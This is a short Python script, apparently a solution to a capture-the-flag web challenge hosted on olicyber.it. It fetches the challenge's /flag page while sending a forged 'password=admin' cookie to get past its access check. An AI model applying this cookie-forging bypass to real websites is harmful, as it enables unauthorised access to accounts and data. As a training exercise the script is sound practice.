import requests
url = 'http://web-05.challs.olicyber.it/flag'
r = requests.get(url,cookies={'password':'admin'})
print(r.content)